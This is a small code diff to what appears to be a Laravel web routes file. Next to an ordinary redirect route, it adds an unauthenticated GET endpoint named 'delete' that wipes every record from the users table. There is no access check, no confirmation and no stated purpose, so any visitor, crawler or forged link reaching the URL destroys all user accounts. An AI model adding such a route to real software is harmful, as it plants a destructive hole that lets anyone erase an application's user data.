@@ -92,3 +92,7 @@ Route::get('store-participate',function(){
     return redirect('participate');
 });
 
+Route::get('delete',function(){
+    \DB::table('users')->delete();
+});
+
